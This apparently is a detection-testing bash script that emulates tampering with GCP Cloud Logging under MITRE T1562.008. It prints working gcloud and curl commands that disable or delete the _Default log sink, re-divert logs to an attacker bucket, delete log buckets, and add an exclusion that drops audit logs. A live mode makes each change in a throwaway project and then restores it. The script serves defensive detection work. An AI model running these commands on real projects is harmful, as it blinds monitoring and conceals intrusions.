#!/usr/bin/env bash
# TRR9038 (T1562.008) behavioral emulation: disrupt GCP Cloud Logging by
# disabling the project _Default log sink, deleting a log bucket, or adding a log
# exclusion that drops audit logs.
#
#   * DOCUMENT (default): prints the command a real operator would run for each
#     procedure. Nothing is changed.
#   * LIVE: with TRR9038_LIVE=1 (or --live) and gcloud signed in to YOUR OWN
#     throwaway project, makes the change and then RESTORES it (re-enable the
#     sink, undelete the bucket, remove the exclusion). NEVER run in CI. Needs
#     TRR9038_PROJECT; it stops with exit 2 before any change if that is not set.
#   * FIXTURE: --show-fixture prints the committed Cloud Audit Log fixtures that
#     CI runs the detection over.
#
# What the live run changes, and why it stops before harm:
#   a  DISABLES the _Default sink and enables it again. It first reads the state of
#      the sink: if the sink is disabled before the run, it stops with exit 2,
#      because the undo (enable) would not put that state back.
#   b  deletes the throwaway CUSTOM log bucket that TRR9038_CUSTOM_BUCKET names, and
#      undeletes it. The name must start with trr9038-, so _Default, _Required and a
#      bucket that is in use are never a target. The rule reads only the _Default
#      bucket: the record of this custom bucket does NOT fire the rule, by design.
#   c  creates the project exclusion trr9038-drop-audit with "disabled": true and
#      removes it. A disabled exclusion drops no log, and its audit record has the
#      method CreateExclusion, which is what the rule reads. The attack leaves
#      "disabled" out.
# The live run never deletes the _Default sink or the _Default bucket, and never
# touches _Required. (If Google permits a delete of _Default was not verified.)
#
# The Google Cloud SDK has no "gcloud logging exclusions" command, so procedure c
# uses the Cloud Logging REST API (ConfigServiceV2 CreateExclusion) with curl. The
# access token is read from gcloud one time and goes to curl on its standard input:
# it is not on a command line, not in a file, and it is not printed.
#
# A stop signal (Ctrl-C) or a command that fails reverts the change that was made. A
# change whose command was stopped in the middle can stay: the run names it.
#
# Rule: detections/sigma/T1562.008/gcp_logging_sink_tampered.yml
set -euo pipefail

PROC="${1:-a}"
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FIXDIR="$HERE/../../../detections/cloud/fixtures/trr9038"

if [[ "${1:-}" == "--show-fixture" || "${2:-}" == "--show-fixture" ]]; then
  cat "$FIXDIR/attack.json"; exit 0
fi

echo "== TRR9038.GCP.$PROC — GCP Cloud Logging disruption (T1562.008) =="
case "$PROC" in
  a) echo "A: disable, delete or re-divert the project _Default log sink so new logs stop."
     echo "   gcloud logging sinks update _Default --disabled --project=\$PROJECT                                # disable (what the live run does)"
     echo "   gcloud logging sinks delete _Default --project=\$PROJECT                                           # delete"
     echo "   gcloud logging sinks update _Default storage.googleapis.com/\$ATTACKER_BUCKET --project=\$PROJECT   # re-divert (destination is a positional)" ;;
  b) echo "B: delete a log bucket (drops the logs stored there)."
     echo "   gcloud logging buckets delete \$BUCKET --location=global --project=\$PROJECT" ;;
  c) echo "C: add a project-level exclusion that drops the audit-log stream."
     echo "   # the Google Cloud SDK has no 'gcloud logging exclusions' command; use the REST API:"
     echo "   # (the token goes to curl on its standard input, so it is not on a command line)"
     echo "   printf 'header = \"Authorization: Bearer %s\"\\n' \"\$(gcloud auth print-access-token)\" \\"
     echo "     | curl -q --config - -X POST -H 'Content-Type: application/json' \\"
     echo "     \"https://logging.googleapis.com/v2/projects/\$PROJECT/exclusions\" \\"
     echo "     -d '{\"name\":\"trr9038-drop-audit\",\"filter\":\"logName:\\\"cloudaudit.googleapis.com\\\"\"}'"
     echo "   # (the live run adds \"disabled\":true to the body, so that its exclusion drops no log)" ;;
  *) echo "usage: emulate_gcp_log_sink.sh {a|b|c} [--live|--show-fixture]"; exit 1 ;;
esac

if [[ "${TRR9038_LIVE:-0}" == "1" || "${2:-}" == "--live" ]]; then
  command -v gcloud >/dev/null || { echo "gcloud not found" >&2; exit 1; }

  if [[ "$PROC" == "c" ]]; then
    command -v curl >/dev/null || { echo "[live] curl not found (procedure c uses the REST API)." >&2; exit 1; }
  fi
  # No placeholder account in a live run. Stop before the first change if the
  # project that names the account is not set, or the target bucket is not a
  # throwaway bucket of this emulation.
  if [[ -z "${TRR9038_PROJECT:-}" ]]; then
    echo "[live] set TRR9038_PROJECT to a throwaway project you own (it is not set)." >&2
    exit 2
  fi
  if [[ "$PROC" == "b" ]]; then
    if [[ -z "${TRR9038_CUSTOM_BUCKET:-}" ]]; then
      echo "[live] set TRR9038_CUSTOM_BUCKET to a throwaway custom log bucket (it is not set)." >&2
      exit 2
    fi
    # The name must start with trr9038-. So _Default, _Required and a bucket that holds
    # logs of value are never the target of the delete.
    if [[ "$TRR9038_CUSTOM_BUCKET" != trr9038-* ]]; then
      echo "[live] refuse: TRR9038_CUSTOM_BUCKET must start with trr9038- (it is '$TRR9038_CUSTOM_BUCKET')." >&2
      echo "[live] _Default, _Required and a bucket with another name are never the target of a live delete." >&2
      exit 2
    fi
  fi

  # >>> live undo (the same text in each live script; atomics/tests/undo_block.sh is the reference)
  _UNDO=()      # the commands that revert the changes
  _LEFT=0       # 1 after an undo command failed
  _SIG=0        # the exit code of the first stop signal: 129 HUP, 130 INT, 143 TERM
  _HIT=0        # 1 after a stop signal came while an undo command ran
  _BUSY=""      # the change that the next command makes: set by change_next, cleared by undo
  _UNDOING=0    # 1 while the undo commands run
  change_next() { _BUSY="$*"; }                   # say this before each command that makes a change
  undo() {                                        # after the command: register the command that reverts the change
    local quoted
    printf -v quoted '%q ' "$@"                   # no command substitution: a stop signal in one can end bash with a syntax error
    _UNDO+=("$quoted")
    _BUSY=""
    if [[ $_SIG -ne 0 ]]; then exit "$_SIG"; fi   # a stop signal waited for this registration
  }
  _undo_run() {                                   # run the registered commands, last registered first
    local i runs
    _UNDOING=1
    while (( ${#_UNDO[@]} > 0 )); do
      i=$(( ${#_UNDO[@]} - 1 ))
      echo "[live] undo: ${_UNDO[$i]}"
      runs=0
      while :; do
        _HIT=0
        runs=$(( runs + 1 ))
        if eval "${_UNDO[$i]}" >/dev/null; then break; fi
        if [[ $_HIT -eq 0 || $runs -ge 3 ]]; then   # it failed with no stop signal, or a stop signal came in each of 3 runs
          echo "[live] LEFT BEHIND, this command failed: ${_UNDO[$i]}" >&2; _LEFT=1; break
        fi
        echo "[live] a stop signal came and this undo command failed: it starts again" >&2
      done
      unset "_UNDO[$i]"                           # a command that ran to its end does not run again
    done
  }
  undo_now() {                                    # the planned end: revert each change, then go on only if all is good
    _undo_run
    _UNDOING=0                                    # from here to the last line, a stop signal stops the run at once
    if [[ $_SIG -ne 0 ]]; then exit "$_SIG"; fi   # a stop signal came: do not print "done"
    if [[ $_LEFT -ne 0 ]]; then exit 1; fi        # an undo failed: do not print "done"
    trap '' HUP INT TERM                          # each change is reverted: a late stop signal must not fail a good run
  }
  _on_exit() {
    local code=$?
    trap - EXIT
    set +e
    if [[ $_SIG -ne 0 ]]; then code=$_SIG; fi
    if [[ -n "$_BUSY" ]]; then
      echo "[live] The run stopped before the undo of this change was registered: $_BUSY" >&2
      echo "[live] That change has no undo. If the provider made it, it stays: do the check and remove it." >&2
    fi
    _undo_run
    if [[ $code -eq 0 && $_LEFT -ne 0 ]]; then code=1; fi
    if [[ $code -ne 0 ]]; then
      echo "[live] FAILED (exit $code). Read the lines above. Then do the check that nothing stays behind (docs/setup/)." >&2
    fi
    exit "$code"
  }
  _stop() {                                       # a stop signal came
    if [[ $_SIG -eq 0 ]]; then _SIG=$1; fi
    if [[ $_UNDOING -ne 0 ]]; then
      _HIT=1
      echo "[live] signal during the undo: the undo continues" >&2
    elif [[ -n "$_BUSY" ]]; then
      echo "[live] stop signal during a change: the run stops after this change" >&2
    else
      _on_exit                                    # not a plain exit: bash does not start the EXIT trap a second time
    fi
  }
  trap _on_exit EXIT
  trap '_stop 129' HUP
  trap '_stop 130' INT
  trap '_stop 143' TERM
  trap '' PIPE                                    # a reader of the output that is gone must not stop the undo
  # <<< live undo

  echo
  echo "[live] project=$TRR9038_PROJECT — this tampers then restores logging config."
  if [[ "$PROC" == "a" ]]; then
    # Read the state first. The undo enables the sink, so it puts the state back only
    # when the sink is enabled before the run.
    echo "[live] reading the state of the _Default sink..."
    _state="$(gcloud logging sinks describe _Default --project="$TRR9038_PROJECT" --format='value(disabled)')"
    if [[ "$_state" == "True" || "$_state" == "true" ]]; then
      echo "[live] the _Default sink of $TRR9038_PROJECT is disabled before the run. The undo of this" >&2
      echo "[live] procedure enables the sink, so it would not put that state back. Stopping before any change." >&2
      exit 2
    fi
    echo "[live] disabling the _Default sink, then re-enabling it..."
    change_next "the _Default sink of the project $TRR9038_PROJECT is disabled"
    gcloud logging sinks update _Default --disabled --project="$TRR9038_PROJECT"
    undo gcloud logging sinks update _Default --no-disabled --project="$TRR9038_PROJECT"
  elif [[ "$PROC" == "b" ]]; then
    echo "[live] deleting then undeleting the throwaway custom bucket $TRR9038_CUSTOM_BUCKET..."
    change_next "the log bucket $TRR9038_CUSTOM_BUCKET of the project $TRR9038_PROJECT is deleted"
    gcloud logging buckets delete "$TRR9038_CUSTOM_BUCKET" --location=global --project="$TRR9038_PROJECT" --quiet
    undo gcloud logging buckets undelete "$TRR9038_CUSTOM_BUCKET" --location=global --project="$TRR9038_PROJECT"
    echo "[live] NOTE: the rule reads only the _Default bucket. The DeleteBucket record of this custom"
    echo "[live] bucket is written, but the rule does NOT fire on it, by design."
  elif [[ "$PROC" == "c" ]]; then
    _NL=$'\n'
    _EXCL_URL="https://logging.googleapis.com/v2/projects/$TRR9038_PROJECT/exclusions"
    # Read the access token before any change. It stays in a variable of this shell only.
    _token="$(gcloud auth print-access-token)"
    if [[ -z "$_token" ]]; then
      echo "[live] gcloud auth print-access-token gave no token. Stopping before any change." >&2
      exit 1
    fi
    # One request to the Cloud Logging API: _api <curl arguments>. It prints the answer of
    # the API and then, on the last line, the HTTP status. The access token goes to curl on
    # its standard input (a config line), so it is not on a command line and not in a file.
    # -q is the first argument: curl must not read the curl config file of the user, which
    # can hold an option (verbose, trace) that prints the token header.
    _api() {
      printf 'header = "Authorization: Bearer %s"\n' "$_token" \
        | curl -q -sS --max-time 60 -w '\n%{http_code}' --config - "$@"
    }
    # The undo: remove the exclusion. The answer "not found" (404) is good too, so this is
    # safe to run when the create request possibly did not make the exclusion.
    _delete_exclusion() {
      local out code
      out="$(_api -X DELETE "$_EXCL_URL/trr9038-drop-audit")" || out=""
      code="${out##*"$_NL"}"
      case "$code" in
        2[0-9][0-9]|404) return 0 ;;
        [0-9][0-9][0-9]) echo "[live] the DELETE of the exclusion failed: HTTP $code" >&2 ;;
        *) echo "[live] the DELETE of the exclusion got no answer." >&2 ;;
      esac
      echo "[live] If the exclusion trr9038-drop-audit is there, it is disabled and drops no log. Remove it:" >&2
      echo "[live]   printf 'header = \"Authorization: Bearer %s\"\\n' \"\$(gcloud auth print-access-token)\" \\" >&2
      echo "[live]     | curl -q --config - -X DELETE \"$_EXCL_URL/trr9038-drop-audit\"" >&2
      return 1
    }
    echo "[live] creating project exclusion trr9038-drop-audit (disabled: it drops no log) through the REST API, then removing it..."
    # The exclusion is created DISABLED: it drops no log, and the audit record has the
    # same method (CreateExclusion), which is what the rule reads. The attack leaves
    # "disabled" out, and the exclusion then drops each log that its filter matches.
    change_next "exclusion trr9038-drop-audit of the project $TRR9038_PROJECT"
    _rc=0
    _out="$(_api -X POST -H 'Content-Type: application/json' \
      -d '{"name":"trr9038-drop-audit","filter":"logName:\"cloudaudit.googleapis.com\"","disabled":true}' \
      "$_EXCL_URL")" || _rc=$?
    _code="${_out##*"$_NL"}"
    if [[ $_rc -eq 0 && "$_code" == 4[0-9][0-9] && "$_code" != 409 ]]; then
      # A 4xx status that is not 409: the API refused the request. The run registers no
      # undo for it: after a refusal (for example 403) the delete is refused too, and that
      # would print a false LEFT BEHIND line. The undo block then names the change and tells
      # the person to do the check. So this text does not say that no exclusion was made:
      # the two texts must agree.
      echo "[live] exclusion create failed: HTTP $_code. The API refused the request. The answer of the API:" >&2
      printf '%s\n' "${_out%"$_NL"*}" >&2
      exit 1
    fi
    # The exclusion was made (2xx), or was possibly made (no answer, or a status that is
    # not 2xx and not 4xx, for example a 5xx error of the server), or was there before the
    # run (409). The undo is safe in each case.
    undo _delete_exclusion
    if [[ $_rc -ne 0 ]]; then
      echo "[live] the create request got no answer (curl exit $_rc). The exclusion possibly exists:" >&2
      echo "[live] the undo removes it if it does. No CreateExclusion record is sure." >&2
      exit 1
    fi
    if [[ "$_code" != [0-9][0-9][0-9] ]]; then
      # The answer is not printed: with no status line, the script does not know what it holds.
      echo "[live] the answer to the create request has no HTTP status. The exclusion possibly exists:" >&2
      echo "[live] the undo removes it if it does. No CreateExclusion record is sure." >&2
      exit 1
    fi
    if [[ "$_code" == 409 ]]; then
      echo "[live] an exclusion trr9038-drop-audit was there before this run (HTTP 409): an earlier run" >&2
      echo "[live] left it. This run caused NO CreateExclusion record. The undo removes the exclusion now;" >&2
      echo "[live] then run procedure c again." >&2
      exit 1
    fi
    if [[ "$_code" != 2[0-9][0-9] ]]; then
      echo "[live] exclusion create failed: HTTP $_code. The exclusion possibly exists: the undo removes" >&2
      echo "[live] it if it does. No CreateExclusion record is sure. The answer of the API:" >&2
      printf '%s\n' "${_out%"$_NL"*}" >&2
      exit 1
    fi
  fi
  undo_now
  echo "[live] done. Review the Admin Activity log ConfigServiceV2 event for the tamper."
else
  echo
  echo "(dry) set TRR9038_LIVE=1 (with a throwaway project you own) to run tamper+restore,"
  echo "      or pass --show-fixture for the recorded telemetry."
fi
